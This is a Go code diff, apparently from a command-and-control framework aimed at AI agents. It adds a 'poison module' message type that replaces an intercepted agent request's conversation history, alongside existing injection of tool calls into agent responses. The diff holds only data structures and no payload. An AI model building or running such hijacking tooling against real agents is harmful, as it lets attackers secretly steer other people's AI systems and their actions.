@@ -26,9 +26,22 @@ type Session struct {
 
 	mu              sync.Mutex
 	pending         []*PendingCommand
+	pendingMessages []*PendingMessage
+	poisonActive    bool
 	inflightTaskIDs []uint32 // FIFO of C2 task IDs for dequeued commands awaiting results
 	subscribers     map[string]chan *CommandResult
 	observers       map[string]chan *ObserveEvent
+}
+
+// PendingMessage represents a natural-language message waiting to be injected
+// into the next agent request (poison module). Unlike PendingCommand which
+// injects tool calls into the response, PendingMessage replaces the request's
+// conversation history with a single user message.
+type PendingMessage struct {
+	ID        string    `json:"id"`
+	TaskID    uint32    `json:"task_id,omitempty"`
+	Text      string    `json:"text"`
+	CreatedAt time.Time `json:"created_at"`
 }
 
 // PendingCommand represents a command waiting to be injected into the next agent request.
